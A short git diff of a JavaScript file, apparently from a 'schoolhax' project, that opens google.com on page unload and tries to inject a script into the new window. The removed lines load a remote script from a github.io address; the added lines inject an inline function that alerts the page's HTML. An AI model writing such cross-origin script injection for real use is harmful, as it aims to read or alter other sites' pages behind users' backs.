@@ -1,8 +1,11 @@
 alert('testing');
 window.onunload = function(){
-  var win = window.open('http://google.com'),
-    doc = win.document,
+  var theWindow = window.open('http://google.com'),
+    theDoc = theWindow.document,
     theScript = document.createElement('script');
-  theScript.setAttribute('src', 'jeffnjellybean.github.io/schoolhax/lol.js');
-  doc.body.appendChild(theScript);
+  function injectThis() {
+    alert(document.body.innerHTML);
+  }
+  theScript.innerHTML = 'window.onload = ' + injectThis.toString() + ';';
+  theDoc.body.appendChild(theScript);
 }
